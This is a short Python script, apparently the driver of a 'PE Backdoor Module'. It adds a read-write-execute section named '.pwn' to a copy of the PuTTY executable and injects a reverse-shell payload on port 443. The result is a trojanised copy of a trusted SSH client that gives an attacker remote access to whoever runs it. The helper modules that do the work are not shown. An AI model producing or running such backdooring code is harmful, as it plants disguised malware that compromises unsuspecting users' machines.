from _init_ import section_injection, payload_injection

print("Running PE Backdoor Module...\n")

print("Adding new section...")
name = 'putty.exe'
injected_path = section_injection.add_section(f"./assets/bin/{name}",
                                              ".pwn",
                                              0x1000,        # Page Size 1024
                                              0x1000,        # Section Size 1024
                                              0xE0000000)    # permissions READ WRITE EXECUTE

print("Injecting payload...")
# insert_payload can take lhost and lport for rev
payload_injection.insert_payload(
    injected_path, 'rev', lport=443)
